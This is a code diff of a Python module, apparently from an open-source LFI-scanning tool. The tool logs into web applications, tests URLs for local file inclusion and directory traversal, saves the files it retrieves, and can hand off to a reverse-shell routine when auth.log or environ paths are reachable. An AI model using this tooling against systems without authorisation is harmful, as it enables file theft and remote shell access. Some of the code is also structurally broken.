@@ -14,8 +14,7 @@ path = ('file://'+os.getcwd()+'/FileStore/')
 
 class Read_File:
    try:
-     def __init__(self):
-            self.control()
+     def __init__(self,**kwargs):
             if self.args.readuser:
                  with open(self.args.readuser,'r') as username:
                       self.args.user = username.read().replace('/n','')
@@ -67,12 +66,12 @@ class Read_File:
             and self.args.password and self.args.user\
             and self.args.Cookie and self.args.loginurl\
             and self.args.read:
-                self.Login_auth()
-                self.url_request()
+                Read_File.Login_auth(self,args = self.control)
+                Read_File.url_request(self,args = self.control)
             elif not self.args.auth and (self.args.Vulnurl or self.args.Domain)\
             and not self.args.password and not self.args.user and self.args.Cookie\
             and self.args.read :
-                self.url_request()
+                Read_File.url_request(self,args = self.control)
             else:
                 print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                 print("[*] Error :  Bad argument Logic command  Error" )
@@ -81,7 +80,7 @@ class Read_File:
                 print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
                 print("[*] ckeck Readme file at      : https://www.github/jac11/LFI_Hunter.git")
                 exit()            
-     def Login_auth(self):
+     def Login_auth(self,**kwargs):
                loginurl = self.args.loginurl
                request = mechanize.Browser()
                request.set_handle_robots(False)
@@ -139,7 +138,7 @@ class Read_File:
                content    = response.read()  
                self.url   = response.geturl()   
                   
-     def url_request(self):  
+     def url_request(self,**kwargs):  
         try: 
            if self.args.Domain:
                domain = str(re.search('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Domain)).split()
@@ -204,7 +203,7 @@ class Read_File:
                     except KeyboardInterrupt:
                          exit()           
                  
-                    if self.args.auth and len(self.Get_Oregnal_URL) != len(first_req) :                  
+                    if self.args.auth and len(self.Get_Oregnal_URL) > len(first_req) :                  
                         pythex = str(re.findall('Content-Length:.+',str(self.info)))
                         pythex= pythex.replace("['",'').replace("']",'')
                         if pythex in str(self.info):
@@ -224,15 +223,13 @@ class Read_File:
                            print("[+] Vulnerable  Link    : ................ | : "+self.url.replace('\n',''))                           
                            self.store_file()                           
                            print('\n'+'='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
-                           print("[+] File request        : ................ | : "+self.args.read.replace('\n','').replace('.','',4)) 
+                           print("[+] File request        : ................ | : "+self.args.read.replace('_',"/")) 
                            print("[+] Full Path           : ................ | : "+self.LFI.replace('\n',''))
-                           print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_').replace('.','',4))
+                           print("[+] File Name           : ................ | : "+self.args.read)
                            if '/' in self.args.read:
-                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"\
-                               +self.args.read.replace('/','',1).replace('/','_').replace('.','',4))  
+                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read)  
                            else:
-                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"\
-                               +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('/','_').replace('.','',4))
+                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read) 
                            if self.args.shell:
                                 if  "auth" in  self.url or "auth.log" in  self.url\
                                 or "environ" in self.url: 
@@ -260,21 +257,21 @@ class Read_File:
                                       exit()            
                            else:
                                 exit()   
-                    elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req):
-                           self.store_file() 
+                    elif not self.args.auth and len(self.Get_Oregnal_URL) > len(first_req):
+                           Read_File.file_name (self,**kwargs)
+                           from Package.FileStore import FileManager
+                           FileManager.FileRStore_Write(self,args=self.control) 
                            print('\n'+'='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                            print("[+] Vulnerable  Link    : ................ | : "+self.url.replace('\n','')) 
                            print('\n'+'='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
-                           print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
+                           print("[+] File request        : ................ | : "+self.args.read.replace("_","/")) 
                            print("[+] Full  URL           : ................ | : "+ self.LFI.replace('\n',''))
-                           print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_').replace('.','',4))
+                           print("[+] File Name           : ................ | : "+self.args.read)
                          
                            if '/' in self.args.read:
-                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"\
-                               +self.args.read.replace('/','',1).replace('/','_').replace('.','',4))  
+                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+'/'+self.args.read) 
                            else:
-                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"\
-                               +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('.','',4).replace('/','_'))              
+                               print("[+] save Locatoin       : ................ | : "+path+self.ip_re+'/'+self.args.read)              
                            if self.args.shell or self.args.port:
                                 if  "auth" in  self.url or "auth.log" in  self.url\
                                 or "environ" in self.url or self.args.port: 
@@ -324,7 +321,7 @@ class Read_File:
         except SyntaxError as a :
                print(a)
                exit()                                                                                             
-     def Reverse_shell(self):
+     def Reverse_shell(self,**kwargs):
                  if not self.args.shell and not self.args.port :
                     exit()
                  else:   
@@ -333,10 +330,14 @@ class Read_File:
                      Shell_conncet.__init__(self)                     
                    except KeyboardInterrupt :
                       exit()
-     def file_name (self):
-        self.args.read = str("".join(re.findall('=.+',self.url)))\
-        .replace("/","_").replace("=",'').replace(".",'')
+     def file_name (self,**kwargs):
+        if not self.args.read :
+          self.args.read = str("".join(re.findall('=.+',self.url)))\
+          .replace("/","_").replace("=",'').replace(".",'')
+        else:
+           self.args.read = re.sub(r'/','_',self.args.read,flags=re.MULTILINE)     
    except Exception  as a :
+
         print(a)                                       
 if __name__=='__main__':
    Read_File()    
